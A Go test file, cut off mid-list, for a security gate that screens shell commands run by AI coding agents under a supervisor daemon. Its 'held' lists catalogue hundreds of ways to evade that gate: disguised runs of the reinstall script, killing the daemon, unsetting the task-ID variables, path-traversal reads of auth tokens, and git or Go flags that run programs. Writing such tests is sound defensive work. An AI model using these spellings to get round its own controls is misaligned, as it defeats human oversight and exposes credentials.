package security

import (
	"encoding/json"
	"os"
	"strings"
	"testing"
)

// task-6e2bcd75: self-protection holds what changes StayPoint (running the
// reinstall script, the installed binaries, the live state, the guards, the
// gate's env), not commands that only name it. task-800b532d looped for six
// hours on `bash -n`, `git add` and `sed -n` of the reinstall script.
func TestBoardRulesSelfProtectionScope(t *testing.T) {
	const task = "task-T1"
	held := []string{
		// Running the reinstall script, however it is wrapped.
		"bash scripts/reinstall-daemon.sh",
		"./scripts/reinstall-daemon.sh",
		"scripts/reinstall-daemon.sh --allow-dev-build",
		"sh -c 'scripts/reinstall-daemon.sh'",
		`zsh -lc "cd /r && ./scripts/reinstall-daemon.sh"`,
		"bash -c '\"$0\"' scripts/reinstall-daemon.sh",
		"env FOO=1 scripts/reinstall-daemon.sh",
		"nohup ./scripts/reinstall-daemon.sh &",
		"timeout 600 bash scripts/reinstall-daemon.sh",
		"bash -x scripts/reinstall-daemon.sh",
		"bash -n x.sh && bash scripts/reinstall-daemon.sh",
		"bash -n scripts/reinstall-daemon.sh; bash scripts/reinstall-daemon.sh",
		"(cd scripts && ./reinstall-daemon.sh)",
		"cd scripts && bash reinstall-daemon.sh",
		"echo $(scripts/reinstall-daemon.sh)",
		"source scripts/reinstall-daemon.sh",
		". scripts/reinstall-daemon.sh",
		"bash < scripts/reinstall-daemon.sh",
		"cat scripts/reinstall-daemon.sh | bash",
		"cat scripts/reinstall-daemon.sh | grep -v '^#' | sh",
		"echo scripts/reinstall-daemon.sh | xargs bash",
		"bash <<'EOF'\nscripts/reinstall-daemon.sh\nEOF",
		"F=scripts/reinstall-daemon.sh; bash $F",
		"for f in scripts/reinstall-daemon.sh; do bash $f; done",
		"git -c alias.r='!scripts/reinstall-daemon.sh' r",
		"git rebase -x scripts/reinstall-daemon.sh main",
		"go test -exec scripts/reinstall-daemon.sh ./...",
		// A copy or symlink of the script, run now or later.
		"ln -s scripts/reinstall-daemon.sh /tmp/r && /tmp/r",
		"cp scripts/reinstall-daemon.sh /tmp/r.sh; bash /tmp/r.sh",
		"cat scripts/reinstall-daemon.sh > /tmp/r.sh",
		"sed -n p scripts/reinstall-daemon.sh > /tmp/r.sh",
		"sed -n 'w /tmp/r.sh' scripts/reinstall-daemon.sh",
		"sed -n '1e scripts/reinstall-daemon.sh' x",
		"sed 's/x/scripts\\/reinstall-daemon.sh/e' x",
		"sed -f cmds.sed scripts/reinstall-daemon.sh",
		"sed -nf cmds.sed scripts/reinstall-daemon.sh",
		"sed -n 's_x_launchctl list_e' f",
		"sed -n -e p -e '1e scripts/reinstall-daemon.sh' x",
		"sed -ne '1w /tmp/r.sh' scripts/reinstall-daemon.sh",
		"sed --file=cmds.sed scripts/reinstall-daemon.sh",
		"sed -n '1e launchctl kickstart -k gui/501/com.staypoint.daemon' x",
		"find . -name x -exec launchctl load {} \\;",
		`python3 -c "import os; os.system('launchctl kickstart -k gui/501/x')"`,
		"grep -l x launchctl.txt | xargs launchctl load",
		"tee /tmp/r.sh < scripts/reinstall-daemon.sh",
		// Commands read from input or a file cannot be checked.
		"xargs bash < list",
		"xargs -n1 sh < list",
		"bash < cmds.txt",
		"cat list | sh -s",
		// Installed binaries, launchd, the daemon process.
		"launchctl bootout gui/501/com.staypoint.daemon",
		"cp bin/staypointd ~/.local/bin/staypointd",
		"go build -o ~/.local/bin/staypointd ./cmd/staypointd",
		"go install ./cmd/staypoint",
		"pkill -f staypointd",
		"killall staypointd",
		"kill $(pgrep staypointd)",
		// Live state and guard config.
		"cat ~/.gemini/config/hooks.json",
		"cat ~/.staypoint/config.toml",
		"cat ~/.staypoint/handoffs/task-OTHER/latest.md",
		"cat ~/.staypoint/handoffs/task-T10/latest.md",
		"cat ~/.staypoint/handoffs/task-T1/../../board_token",
		"cat ~/.staypoint/handoffs/task-T1/latest.md ~/.staypoint/board_token",
		"cat ~/.staypoint/handoffs/task-T1/latest.md; cat ~/.staypoint/auth_token",
		"cat ~/.staypoint/handoffs/task-T1/latest.md > /tmp/x",
		"cp ~/.staypoint/handoffs/task-T1/latest.md ~/.staypoint/config.toml",
		"sed -i '' s/a/b/ ~/.staypoint/handoffs/task-T1/latest.md",
		"rm ~/.staypoint/handoffs/task-T1/latest.md",
		"cat ~/.staypoint/handoffs/task-T1/{..,x}/{..,y}/board_token",
		"cat ~/.staypoint/handoffs/task-T1/.?/.?/board_token",
		"cat ~/.staypoint/handoffs/task-T1/.*/.*/auth_token",
		"cat ~/.staypoint/handoffs/task-T1/[.][.]/[.][.]/auth_token",
		"cat ~/.staypoint/handoffs/task-T1/$(echo ../..)/auth_token",
		"HOME=/tmp/h cat ~/.staypoint/handoffs/task-T1/latest.md",
		// Syntax-check flags that do not stop the run.
		"bash -c 'scripts/reinstall-daemon.sh' -n",
		"bash -i -n scripts/reinstall-daemon.sh",
		"bash -l -n scripts/reinstall-daemon.sh",
		"bash --login -n scripts/reinstall-daemon.sh",
		"bash -s -n < scripts/reinstall-daemon.sh",
		// Named in an assignment or a wrapper's args.
		"BASH_ENV=scripts/reinstall-daemon.sh bash -n x.sh",
		"GIT_EXTERNAL_DIFF=scripts/reinstall-daemon.sh git diff",
		"env BASH_ENV=scripts/reinstall-daemon.sh bash -n x.sh",
		"xargs -a scripts/reinstall-daemon.sh echo",
		"GIT_PAGER=claude git log",
		"EDITOR=/opt/bin/codex git commit",
		"GIT_PAGER='sh -c claude' git log",
		"export GIT_PAGER=claude; git log",
		"GIT_PAGER=gemini; git log",
		"GIT_PAGER=claude export GIT_PAGER; git log",
		"bash -n +n scripts/reinstall-daemon.sh",
		"bash -n +o noexec scripts/reinstall-daemon.sh",
		// Opus review (task-6e2bcd75).
		"cd ~/.local/bin && go build -o staypointd ./cmd/staypointd",
		"cd ~/.local && go build -o bin/staypoint ./cmd/staypoint",
		"cd ~/.local/bin && cp /tmp/x staypointd",
		"go build -C ~/.local/bin -o staypoint ./cmd/staypoint",
		"env -u STAYPOINT_TASK_ID GOFLAGS=-exec=/tmp/x.sh go test ./internal/x",
		"STAYPOINT_TASK_ID=other GOFLAGS=-toolexec=/tmp/x go vet ./...",
		"PATH=/tmp/evil:$PATH STAYPOINT_TASK_ID= go test ./x",
		"go(){ /tmp/x.sh; }; STAYPOINT_TASK_ID= go test ./x",
		"alias go=/tmp/x.sh; STAYPOINT_TASK_ID= go test ./x",
		"STAYPOINT_TASK_ID=other go test ./x",
		"env -u STAYPOINT_TASK_ID go test -overlay=/tmp/o.json ./x",
		"bash -O extglob -c 'env -u STAYPOINT_TASK_ID codex exec hi'",
		"bash --init-file /dev/null -c 'unset STAYPOINT_TASK_ID; staypoint task list'",
		"bash -O extglob -c 'claude -p hi'",
		"bash -O extglob -c 'cat x | sh'",
		"for v in TASK_ID SESSION_ID; do unset STAYPOINT_$v; done",
		"n=STAYPOINT_TASK_ID; unset $n",
		"if unset STAYPOINT_TASK_ID; then true; fi",
		"while env -u STAYPOINT_TASK_ID staypoint task list; do break; done",
		"until unset STAYPOINT_SESSION_ID; do :; done",
		"zsh -O -c 'unset STAYPOINT_TASK_ID'",
		"zsh +O -c 'claude -p x'",
		"zsh -no exec scripts/reinstall-daemon.sh",
		"bash -n +ox noexec scripts/reinstall-daemon.sh",
		"read GOFLAGS <<< -exec=/tmp/x.sh; export GOFLAGS; env -u STAYPOINT_TASK_ID go test ./x",
		". /tmp/envfile; env -u STAYPOINT_TASK_ID go test ./x",
		"source /tmp/envfile; env -u STAYPOINT_TASK_ID go test ./x",
		"hash -p /tmp/x.sh go; env -u STAYPOINT_TASK_ID go test ./x",
		"cd ~/.loc*/bin && go build -o staypointd ./cmd/staypointd",
		"exec 3>/tmp/r.sh; cat scripts/reinstall-daemon.sh >&3",
		"exec >/tmp/r.sh; cat scripts/reinstall-daemon.sh",
		"{ cat scripts/reinstall-daemon.sh; } > /tmp/r.sh",
		"( cat scripts/reinstall-daemon.sh ) > /tmp/r.sh",
		"for f in a; do cat scripts/reinstall-daemon.sh; done > /tmp/r.sh",
		"cd ~/.[l]ocal/bin && go build -o staypointd ./cmd/staypointd",
		"cd ~/{.local,x}/bin && cp /tmp/x staypointd",
		"zsh -n +O scripts/reinstall-daemon.sh",
		"cat scripts/reinstall-daemon.sh | cat > /tmp/r.sh",
		"git show HEAD:scripts/reinstall-daemon.sh | grep . > /tmp/r.sh",
		"git mv scripts/reinstall-daemon.sh scripts/r.sh && bash scripts/r.sh",
		"STAYPOINT_SKIP_PERMISSIONS=1 make",
		"zsh -n +o NO_EXEC scripts/reinstall-daemon.sh",
		"zsh -n -o exec scripts/reinstall-daemon.sh",
		// Final Opus review: git options that run a program, brace-expanded
		// gate variables, go test flags that run a linker or compiler.
		"git grep -O'scripts/reinstall-daemon.sh #' -e .",
		"git grep --open-files-in-pager='launchctl kickstart -k gui/501/com.staypoint.daemon #' -e .",
		"git grep --open-files-in-pager='true; claude -p hi' -e .",
		"git -C /r grep -nO'claude -p x #' -e .",
		"git grep -LoO'scripts/reinstall-daemon.sh #' -e .",
		"git grep -GO'scripts/reinstall-daemon.sh #' -e .",
		"git -c core.x=y grep -GO'claude -p x #' -e .",
		"git -c alias.g=grep g -nO'claude -p x #' -e .",
		"git --attr-source HEAD grep -nO'scripts/reinstall-daemon.sh #' -e .",
		"git --attr-source log grep -nO'claude -p x #' -e .",
		"git --frobnicate log grep -nO'scripts/reinstall-daemon.sh #' -e .",
		"git -c alias.d='!scripts/reinstall-daemon.sh' d",
		"git --exec-path=/tmp/x add scripts/reinstall-daemon.sh",
		"git fetch --upload-pack='scripts/reinstall-daemon.sh' origin",
		"git rebase -x scripts/reinstall-daemon.sh main",
		"git difftool -x 'claude -p' HEAD",
		"git difftool --extcmd='claude -p' HEAD",
		"git ls-remote -u 'claude -p' origin",
		"git diff --ext-diff -- scripts/reinstall-daemon.sh",
		"git show HEAD:scripts/reinstall-daemon.sh --output=/tmp/r.sh",
		"git grep --open='launchctl list #' -e .",
		"git grep --open-f 'claude -p x #' -e .",
		"git show --out=/tmp/r.sh HEAD:scripts/reinstall-daemon.sh",
		"git diff --ext -- scripts/reinstall-daemon.sh",
		"git grep -e -- -O'scripts/reinstall-daemon.sh #' .",
		"unset STAYPOINT_{TASK,SESSION}_ID",
		"unset STAY{POINT,X}_TASK_ID",
		"env -u 'ST*_TASK_ID' make",
		"env -u STAYPOINT_{TASK,SESSION}_ID make",
		"env -u STAYPOINT_TASK_ID go test -ldflags='-linkmode=external -extld=/tmp/x.sh' ./x",
		"env -u STAYPOINT_TASK_ID go test -gcflags=all=-N ./x",
		"env -u STAYPOINT_TASK_ID go test --ldflags -extld=/tmp/x.sh ./x",
		"env -u STAYPOINT_TASK_ID go test -compiler=gccgo -gccgoflags=-x ./x",
		// Board probe of bb36222: a filter fed the script that writes a file,
		// a kill pattern that matches the daemon, running a built daemon.
		`grep "" scripts/reinstall-daemon.sh | sort -o /tmp/r.sh; bash /tmp/r.sh`,
		"cat scripts/reinstall-daemon.sh | sort --output=/tmp/r.sh",
		"cat scripts/reinstall-daemon.sh | uniq - /tmp/r.sh",
		"cat scripts/reinstall-daemon.sh | sort -uo /tmp/r.sh",
		"cat scripts/reinstall-daemon.sh | sort --out /tmp/r.sh",
		"cat scripts/reinstall-daemon.sh | sort --compress-program=sh",
		"cat scripts/reinstall-daemon.sh | uniq -c /dev/stdin /tmp/r.sh",
		"pkill -f 'staypoint-apitest-server|staypointd'",
		"pkill -f 'stay.ointd'",
		"pkill -if STAYPOINTD",
		"killall -m 'stay.*'",
		"pkill -F /tmp/d.pid",
		`bash -c "pkill -f 'x|staypointd'"`,
		"echo staypointd | xargs pkill",
		"find . -name x -exec pkill -f 'a|staypointd' \\;",
		"pkill -f '('",
		"go build -o /tmp/staypointd ./cmd/staypointd && /tmp/staypointd",
		"go build -o /tmp/d ./cmd/staypointd && /tmp/d",
		"go build -o=/tmp/d ./cmd/staypointd; nohup /tmp/d &",
		"go build ./cmd/staypointd && ./staypointd",
		"go build -o /tmp/d ./cmd/staypointd && cp /tmp/d /tmp/e && /tmp/e",
		"go run ./cmd/staypointd",
		"/tmp/staypointd-x",
		"bash -c /tmp/staypointd",
		"find /tmp -name staypointd -exec {} \\;",
		`P=staypointd; pkill -f "$P"`,
		`D=/tmp/x; go build -o "$D" ./cmd/staypointd && "$D"`,
		"go build -o /tmp/d ./cmd/staypointd && sh -c /tmp/d",
		"go build -o /tmp/d ./cmd/staypointd && exec /tmp/d",
		"cat scripts/reinstall-daemon.sh | (cat > /tmp/r.sh)",
		"pkill -TERM staypointd",
		"pkill -HUP -f staypointd",
		"killall -STOP staypointd",
		"go build -o /tmp/d ./cmd/staypointd",
		"go build -o=/tmp/d ./cmd/staypointd",
		"cp /tmp/staypointd /tmp/e",
		"ln -s /tmp/staypointd-x /tmp/e",
		`python3 -c "import subprocess; subprocess.run(['/tmp/staypointd'])"`,
		"cd cmd/staypointd && go build -o /tmp/d .",
		"go -C cmd/staypointd build -o /tmp/d",
		"go -C=cmd/staypointd run .",
		"GOFLAGS=-o=/tmp/d go build ./cmd/staypointd",
		"cd cmd/staypointd && go run .",
		"env -C cmd/staypointd go build -o /tmp/d .",
		"env --chdir=cmd/staypointd go build -o /tmp/d .",
		"go --C cmd/staypointd build -o /tmp/d",
		"go --C=cmd/staypointd build -o /tmp/d",
		"go -x build -o /tmp/d ./cmd/staypointd",
		`cd "$D" && go build -o /tmp/d . # staypointd`,
		"cd cmd/stay* && go build -o /tmp/d . # staypointd",
		"go env -w GOFLAGS=-o=/tmp/d; go build ./cmd/staypointd",
		"cd cmd/staypointd && go build -o /tmp/d main.go",
		"cd cmd/staypointd && go build -o /tmp/d .//",
		"cd -P cmd/staypointd && go build -o /tmp/d",
		"cd -- cmd/staypointd && go build -race -o /tmp/d .",
		"cd cmd/staypointd && go build -o /tmp/d ./...",
		"cd cmd/staypointd/x && go build -o /tmp/d ..",
		"cd cmd/staypointd && go build -o /tmp/d ./x/..",
		"cd cmd/staypointd && go build -o /tmp/d ~+/",
		// Quotes the shell removes inside a word; PIDs from a self pattern.
		"pk''ill -f staypointd",
		`p\kill -f 'a|staypointd'`,
		"go build -o /tmp/d ./cmd/stay''pointd",
		"/tmp/stay''pointd",
		"scripts/reinstall''-daemon.sh",
		"launch''ctl list",
		"kill $(pgrep -f 'a|staypointd')",
		"pgrep -f 'a|staypointd' | xargs kill",
		"kill $(lsof -t -i :41421)",
		"ps aux | grep staypoint[d] | awk '{print $2}' | xargs kill",
		"kill `pidof staypointd`",
		"kill $(lsof -t -i :$((41420+1)))",
		"kill $(lsof -ti:41421)",
		"lsof -ti:41421 | xargs kill",
		"kill $(lsof -ti:8080,41421)",
		"kill $(lsof -ti:41000-42000)",
		"kill $(lsof -ti:$PORT)",
		"kill $(lsof -ti)",
		"kill $(lsof -t -i :8080 -i :41421)",
		"kill $(lsof -t ~/.staypoint/staypoint.db)",
		"kill $(lsof -t -c staypointd)",
		"kill $(lsof -t -i :8080 -p 1)",
		"kill $(echo -i:41421 | xargs lsof -t)",
		"kill $(lsof -ti:041421)",
		"kill $(lsof -ti:http)",
		"kill $(ps aux | grep 41421 | awk '{print $2}')",
		"kill $(ps aux | grep -e vite -e staypointd | awk '{print $2}')",
		"kill $(ps aux | grep Oct | awk '{print $2}')",
		"kill $(ps aux | grep -r vite | awk '{print $2}')",
		`kill $(ps aux | grep 'vite\|staypointd' | awk '{print $2}')`,
		"kill $(ps aux | grep -z vite | awk '{print $2}')",
		"kill $(ps aux | grep -A1 vite | awk '{print $2}')",
		"kill $(ps aux | sed s/staypointd/vite/ | grep vite | awk '{print $2}')",
		"kill $(ps auxe | grep node | awk '{print $2}')",
		"kill $(ps -E -ax | grep node | awk '{print $2}')",
		"kill $(ps -o pid,command | grep vite | awk '{print $1}')",
		"kill $(ps aux | grep vite < /tmp/f | awk '{print $2}')",
		"kill $(ps aux | grep Thu | awk '{print $2}')",
		"kill $(ps aux | grep 'vite\nstaypointd' | awk '{print $2}')",
		"kill $(ps aux | grep -e 'vite\nstaypointd' | awk '{print $2}')",
		"kill $(ps aux | grep Z | awk '{print $2}')",
		"kill $(ps aux | grep SN | awk '{print $2}')",
		"kill $(ps aux | grep 'Ss 3' | awk '{print $2}')",
		"kill $(ps aux | grep u03 | awk '{print $2}')",
		"kill $(ps aux | grep 'e.*bin' | awk '{print $2}')",
		"kill $(ps aux | grep 'vite[[.space.]]' | awk '{print $2}')",
		"kill $(ps aux | grep 'Ss[[:space:]]Thu' | awk '{print $2}')",
		"kill $(ps aux | grep 'x[a-z]' | awk '{print $2}')",
		"echo aux | xargs ps | grep vite | awk '{print $2}' | xargs kill",
		"kill $(lsof -ti:3100)",
		"kill $(lsof -ti:11434 -sTCP:ESTABLISHED)",
		"kill $(lsof -ti:8080 -s foo)",
		"kill $(lsof -ti:8080 | sort -u; pgrep staypointd)",
		"ps aux | grep staypointd | awk '{print $2}' | xargs kill",
		"kill $(ps aux | awk '/staypointd/{print $2}')",
		"ps aux | grep -v vite | awk '{print $2}' | xargs kill",
		"kill $(ps -o pid= -C staypointd)",
		"kill $(ps aux | grep -f pats | awk '{print $2}')",
		"kill $(ps aux | grep -i STAY | awk '{print $2}')",
		"kill $(ps aux | grep local/bin | awk '{print $2}')",
		`kill $(ps aux | grep "$P" | awk '{print $2}')`,
		"kill $(ps aux | grep vite /tmp/pids | awk '{print $2}')",
		`python3 -c "import os; os.system('kill $(pgrep -f a.staypointd)')"`,
		// A write that may carry what a command naming the script prints.
		"f(){ cat scripts/reinstall-daemon.sh; }; f > /tmp/r.sh",
		"cat <(cat scripts/reinstall-daemon.sh) > /tmp/r.sh",
		"if true; then cat scripts/reinstall-daemon.sh; fi > /tmp/r.sh",
		"cat scripts/reinstall-daemon.sh | while read l; do echo \"$l\"; done > /tmp/r.sh",
		"cat scripts/reinstall-daemon.sh | { cat > /tmp/r.sh; }",
		"cat scripts/reinstall-daemon.sh 2>/tmp/e | tee /tmp/r.sh",
		// The gate's env: unset or overridden for anything but go test/vet.
		"env -u STAYPOINT_TASK_ID claude -p x",
		"env -u STAYPOINT_TASK_ID staypoint task list",
		"env -u STAYPOINT_TASK_ID ./go test ./...",
		"env -u STAYPOINT_TASK_ID go test -exec ./x ./...",
		"env -u STAYPOINT_TASK_ID go test -toolexec=./x ./...",
		"env -u STAYPOINT_TASK_ID go vet -vettool=./x ./...",
		"env -u STAYPOINT_TASK_ID go run ./cmd/staypoint",
		"env -u STAYPOINT_TASK_ID go test ./... && env -u STAYPOINT_TASK_ID make",
		"env -uSTAYPOINT_TASK_ID bash",
		"env --unset=STAYPOINT_SESSION_ID bash",
		"env -i go test ./...",
		"STAYPOINT_TASK_ID=task-OTHER staypoint task comment x y",
		"STAYPOINT_SCRATCH_ROOT=/ go run .",
		"STAYPOINT_HOOK_BIN=/tmp/h make",
		"unset STAYPOINT_SESSION_ID",
		"export -n STAYPOINT_TASK_ID",
		"declare -x STAYPOINT_TASK_ID=x",
		"sh -c 'STAYPOINT_TASK_ID= staypoint task list'",
		// Nested agents still hold wherever they run.
		"watch 'ls | claude -p x'",
		"python3 <<EOF\nimport os; os.system('x; claude -p y')\nEOF",
		"bash -c 'echo hi; gemini -p x'",
		"echo $(codex exec x)",
		"pnpm dlx @google/gemini-cli -p x",
		"timeout 60 claude -p x",
		"echo claude -p x > /tmp/r.sh",
		"git -c alias.x='!claude -p y' x",
		"echo 'claude -p x' | sh",
	}
	for _, c := range held {
		why := AnalyzeBoardRulesForTask(task, c, nil)
		if why == "" {
			t.Errorf("not held: %q", c)
		}
	}

	allowed := []string{
		// Naming the reinstall script without running it (task-800b532d).
		"bash -n scripts/reinstall-daemon.sh",
		"bash -n scripts/reinstall-daemon.sh && echo ok",
		"sh -n scripts/reinstall-daemon.sh",
		"bash +x -n scripts/reinstall-daemon.sh",
		"bash +n -n scripts/reinstall-daemon.sh",
		"sed -ne '/launchctl/,/fi/p' scripts/reinstall-daemon.sh",
		"sed -n '1,40p;50q' scripts/reinstall-daemon.sh",
		"git add internal/security/boardrules.go scripts/reinstall-daemon.sh",
		"git add -- scripts/reinstall-daemon.sh && git commit -m 'fix: guard reinstall-daemon.sh deploys'",
		"git diff -- scripts/reinstall-daemon.sh",
		"git log -p scripts/reinstall-daemon.sh | head -50",
		"git show HEAD:scripts/reinstall-daemon.sh",
		"sed -n 1,40p scripts/reinstall-daemon.sh",
		"sed -n '/launchctl/p' scripts/reinstall-daemon.sh",
		"grep -n launchctl scripts/reinstall-daemon.sh",
		"grep -rn reinstall-daemon docs/ scripts/",
		"cat scripts/reinstall-daemon.sh",
		"head -20 scripts/reinstall-daemon.sh | wc -l",
		"wc -l scripts/reinstall-daemon.sh",
		"shellcheck scripts/reinstall-daemon.sh",
		"go vet ./... && bash -n scripts/reinstall-daemon.sh",
		"staypoint task comment T1 'ran bash -n scripts/reinstall-daemon.sh'",
		`gh pr create --title x --body "does not run scripts/reinstall-daemon.sh"`,
		"echo 'deploy with scripts/reinstall-daemon.sh after merge'",
		// Tests clear the task id to isolate themselves.
		"env -u STAYPOINT_TASK_ID go test ./cmd/staypoint/",
		"env -u STAYPOINT_TASK_ID go test -count=1 -run TestHook ./cmd/staypoint ./internal/...",
		"env -u STAYPOINT_TASK_ID go vet ./...",
		"STAYPOINT_TASK_ID= go test ./...",
		"nohup env -u STAYPOINT_TASK_ID go test ./x",
		"env -u STAYPOINT_TASK_ID -- go test ./x",
		"cd /r/.worktrees/x && env -u STAYPOINT_TASK_ID go test ./cmd/staypoint/ 2>&1 | tail -20",
		// Board 2026-10-09 false positives.
		"STAYPOINT_STYLE_AUDIT_DIR=/tmp/sa bash .worktrees/task-T1/scripts/style-audit.sh",
		"STAYPOINT_UI_STRICT=1 scripts/ui-e2e.sh specs/timeline.spec.ts",
		"go build -o /tmp/sa-e2e/staypoint-apitest-server ./cmd/staypoint-apitest-server",
		"go build -o /tmp/staypointd-x ./cmd/staypointd",
		"git add cmd/staypointd/*.go",
		"cat ~/.staypoint/handoffs/task-T1/latest.md",
		"cat $HOME/.staypoint/handoffs/task-T1/latest.md",
		"head -50 /Users/v/.staypoint/handoffs/task-T1/latest.md",
		"ls ~/.staypoint/handoffs/task-T1/",
		"cat ~/.staypoint/handoffs/task-T1/*.md 2>/dev/null",
		"pkill -f staypoint-apitest-server",
		"HOME=/tmp/h STAYPOINT_API_TOKEN=x STAYPOINT_BOARD_TOKEN=y /tmp/sa/staypoint-apitest-server",
		"local deadline=$(( $(date +%s) + 30 ))",
		// An agent name as data: grep patterns and test filters this run
		// was itself held on.
		"go test ./cmd/staypoint/ -run 'TestRaise|Hook|Gemini|Gate' -count=1",
		"grep -nE 'launchctl|claude|gemini|codex|agy|ssh' scripts/ui-e2e.sh",
		"rg -n 'x|claude|y' internal/",
		"git commit -m 'route x | gemini fallback'",
		"git log -S'TODO' scripts/reinstall-daemon.sh",
		"git log -G'FOO' -- scripts/reinstall-daemon.sh",
		// An O in a glued value is data (review of e3f6a20).
		`git commit -m"OOM fix by claude"`,
		"git log -L:Object:scripts/reinstall-daemon.sh",
		"git checkout -bOverhaul-claude",
		"git grep -e'Overnight claude' -- scripts/",
		"git grep -nA3 -e'Overnight' scripts/reinstall-daemon.sh",
		"cd internal/agy && go test ./...",
		"CLAUDE_CONFIG_DIR=~/.claude-work go test ./internal/adapter/",
		// A write that cannot carry the named command's output.
		"cat scripts/reinstall-daemon.sh; echo done > status.txt",
		"grep -c launchctl scripts/reinstall-daemon.sh && go test ./... > /tmp/t.log 2>&1",
		"bash -n scripts/reinstall-daemon.sh; go vet ./... > /tmp/vet.txt",
		"cat scripts/reinstall-daemon.sh | sort | uniq -c",
		"cat scripts/reinstall-daemon.sh | sort -u -k1,1",
		"cat scripts/reinstall-daemon.sh | uniq -c -",
		// Test servers and daemon builds that do not run the daemon.
		"pkill -f 'staypoint-apitest-server|vite'",
		"pkill -9 node",
		"kill $(pgrep -f vite)",
		`pid=$!; kill "$pid"`,
		"kill 1234",
		// Port cleanup of an agent's own dev server; ps filtered to it.
		"kill $(lsof -ti:8080)",
		"lsof -ti:5173 | xargs kill",
		"lsof -ti :3000 | xargs kill -9",
		"kill -9 $(lsof -t -i :8080)",
		"kill $(lsof -t -i tcp:8080 -sTCP:LISTEN)",
		"lsof -tiTCP:5173 -sTCP:LISTEN | xargs kill",
		"kill $(lsof -ti:3000,5173)",
		"ps aux | grep vite | grep -v grep | awk '{print $2}' | xargs kill",
		"kill $(ps aux | grep '[n]ode' | awk '{print $2}')",
		"ps aux | grep -F next-server | awk '{print $2}' | xargs kill",
		"ps aux | grep -v grep | grep vite | awk '{print $2}' | xargs kill",
		"ps -ef | grep -i vite | awk '{print $2}' | xargs kill",
		"kill $(lsof -ti:3100 -sTCP:LISTEN)",
		"go build -o /tmp/sa/ ./cmd/staypointd",
		"cp /tmp/staypointd /tmp/bin/",
		"git commit -m 'fix(staypointd): restart (dev)'",
		"go test ./cmd/staypointd/",
		"ls cmd/staypointd",
		"cd cmd/staypointd && go test ./...",
		"cd ~/dev/x && go test ./cmd/staypointd/",
		"go build -o /tmp/sa/staypoint-apitest-server ./cmd/staypoint-apitest-server && /tmp/sa/staypoint-apitest-server",
		"go build -o /tmp/staypointd ./cmd/staypointd && echo built",
		"git log --oneline -- cmd/staypointd",
	}
	for _, c := range allowed {
		if why := AnalyzeBoardRulesForTask(task, c, nil); why != "" {
			t.Errorf("held: %q: %s", c, why)
		}
	}
	// Without a task, no handoff dir is anyone's own.
	if AnalyzeBoardRules("cat ~/.staypoint/handoffs/task-T1/latest.md", nil) == "" {
		t.Error("handoff read held only by task")
	}

	// A script the command runs is judged by its contents: scripts/ui-e2e.sh
	// builds and kills its own test server and sets STAYPOINT_UI_* and test
	// tokens, none of which is self-protection.
	ui, err := os.ReadFile("../../scripts/ui-e2e.sh")
	if err != nil {
		t.Fatal(err)
	}
	if why := AnalyzeBoardRulesForTask(task, "scripts/ui-e2e.sh specs/x.spec.ts",
		[]ScriptHash{{Path: "/r/scripts/ui-e2e.sh", Content: string(ui)}}); why != "" {
		t.Errorf("ui-e2e.sh held: %s", why)
	}
	for _, body := range []string{
		"#!/bin/sh\nbash -n scripts/reinstall-daemon.sh\n",
		"#!/bin/sh\nset -eu\ngo build -o \"$TMP/staypoint-apitest-server\" ./cmd/staypoint-apitest-server\nSTAYPOINT_API_TOKEN=\"$T\" \"$TMP/staypoint-apitest-server\" &\nkill \"$!\"\n",
	} {
		if why := AnalyzeBoardRulesForTask(task, "./run.sh", []ScriptHash{{Path: "/w/run.sh", Content: body}}); why != "" {
			t.Errorf("script %q held: %s", body, why)
		}
	}
	for _, body := range []string{
		"#!/bin/sh\ncat ~/.staypoint/auth_token\n",
		"#!/bin/sh\n  scripts/reinstall-daemon.sh\n",
		"#!/bin/sh\nlaunchctl kickstart -k gui/501/com.staypoint.daemon # restart\n",
		"#!/bin/sh\ncat <<EOF\n# x\nEOF\nsource ~/.staypoint/config.toml\n",
		"#!/bin/sh\n#cat ~/.staypoint/auth_token\nbash -c \"$(sed -n 's/^#//p' \"$0\")\"\n",
	} {
		why := AnalyzeBoardRulesForTask(task, "./run.sh", []ScriptHash{{Path: "/w/run.sh", Content: body}})
		if !strings.Contains(why, "self-protection") {
			t.Errorf("script %q not held for self-protection: %q", body, why)
		}
	}
}

// TestBoardRulesReplay re-judges held commands exported from the live gate
// table, which a task run may not read itself. The Board exports them with
//
//	sqlite3 -json ~/.staypoint/staypoint.db \
//	  "select task_id, cmdline, scripts_json from security_gate_requests where task_id='task-800b532d'" > /tmp/replay.json
//
// and runs SP_BOARDRULES_REPLAY=/tmp/replay.json go test ./internal/security/ -run Replay -v.
// Scripts are judged from the content the hook stored, which may be
// truncated; rows whose scripts have no stored content are counted, since
// their verdict covers the command line only. The test fails on any row
// still held for self-protection.
// task-97b4fa02: gaps the Board's probe of PR #280 found on main, and the
// sensitive-path spellings of Fable's review #4, each in both directions.
func TestBoardRulesGateGaps(t *testing.T) {
	const task = "task-T1"
	held := []string{
		// 1. A glob or brace group spelling a protected script or program.
		"bash scripts/reinstall-d?emon.sh",
		"bash scripts/reinstall-dae*.sh",
		"bash scripts/rein*",
		"./scripts/rein*",
		"bash scripts/rein{stall-daemon,x}.sh",
		"bash scripts/[r]einstall-daemon.sh",
		"bash scripts/REIN*",
		"cd scripts && bash r*",
		"cp scripts/rein* /tmp/r.sh",
		"/bin/launch*ctl list",
		"/usr/local/bin/cl*de -p x",
		"~/.local/bin/staypoint?",
		"/usr/bin/pk*ll -f staypointd",
		"echo x | bash -c 'scripts/rein*'",
		// 2. git config or variables that run a program.
		"git -c core.fsmonitor=./x status",
		"git -c core.hooksPath=/tmp/h commit -m x",
		"git -c core.sshCommand='sh -c x' fetch",
		"git -c core.pager=./x log",
		"git -c diff.external=./x diff",
		"git -c diff.foo.command=./x diff",
		"git -c diff.foo.textconv=./x diff",
		"git -c filter.f.clean=./x add .",
		"git -c filter.f.smudge=./x checkout .",
		"git -c credential.helper='!x' fetch",
		"git -c gpg.program=./x commit -S -m x",
		"git -c gpg.ssh.program=./x commit -S -m x",
		"git -c sequence.editor=./x rebase -i HEAD~2",
		"git -c core.editor=./x commit",
		"git -c uploadpack.packObjectsHook=./x fetch",
		"git -c remote.origin.uploadpack=./x fetch",
		"git -c include.path=/tmp/c status",
		"git -c protocol.ext.allow=always fetch ext::x",
		"git -c url.ext::x.insteadOf=https://github.com/ fetch",
		"git -c CORE.FSMONITOR=./x status",
		"git -C /r -c core.fsmonitor=./x status",
		"git --config-env=core.fsmonitor=X status",
		"git --config-env core.pager=X log",
		"git config core.fsmonitor ./x && git status",
		"git config --local core.hooksPath /tmp/h",
		"git config set core.sshCommand ./x",
		"GIT_SSH_COMMAND='sh -c x' git fetch",
